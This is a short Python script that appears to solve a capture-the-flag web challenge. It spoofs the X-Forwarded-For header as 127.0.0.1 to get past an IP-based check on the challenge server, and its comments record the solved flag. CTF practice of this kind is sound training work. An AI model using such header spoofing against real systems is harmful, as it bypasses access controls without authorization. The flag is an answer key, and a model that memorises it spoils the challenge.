import requests
r = requests.get("http://ctf.adl.tw:12001/",
                 headers={'X-Forwarded-For': '127.0.0.1'})
print(r.text)

# img.alt + cookit._FLAG + python_request
# ADL{D00N_dOoN_D0On_DoN_Do0n!!Pek0_ChAn_KaWa!i_h@_h@_hд_ha_hд}